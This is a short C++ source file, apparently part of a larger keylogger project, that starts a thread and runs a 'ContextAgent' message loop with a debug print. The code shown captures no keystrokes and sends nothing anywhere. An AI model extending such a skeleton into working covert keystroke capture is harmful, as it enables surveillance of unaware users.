//
// Created by Etienne Pasteur on 17/10/2017.
//

#include <FocusKeyLogger.hpp>
#include <iostream>

void FocusKeyLogger::Run()
{
	_keyLoggerThread = std::make_unique<std::thread>(std::bind(&FocusKeyLogger::RunKeyLogger, this));
}

void FocusKeyLogger::RunKeyLogger() {
	std::cout << "RunKeyLogger function is called properly !" << std::endl;
	ContextAgent->Run(); //Block the current thread beacause msg loop windows (Remove after adding other components)
}